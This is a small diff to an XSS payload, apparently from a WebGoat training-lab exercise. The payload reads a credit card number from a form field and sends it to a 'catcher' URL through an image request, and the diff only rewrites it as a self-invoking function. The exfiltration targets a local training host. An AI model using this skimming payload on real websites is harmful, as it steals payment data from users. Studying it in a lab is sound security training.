@@ -1,5 +1,5 @@
 <script>
-	function hack() {
+	(function hack() {
 		var creditCardNumber = encodeURI(document.getElementsByName('field2')[0].value);
 		var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&card=" + creditCardNumber;
 		var XSSImage = new Image();
@@ -8,6 +8,5 @@
 		while (message.firstChild) {
 			message.removeChild(message.firstChild);
 		}
-	}
-	hack();
+	})();
 </script>
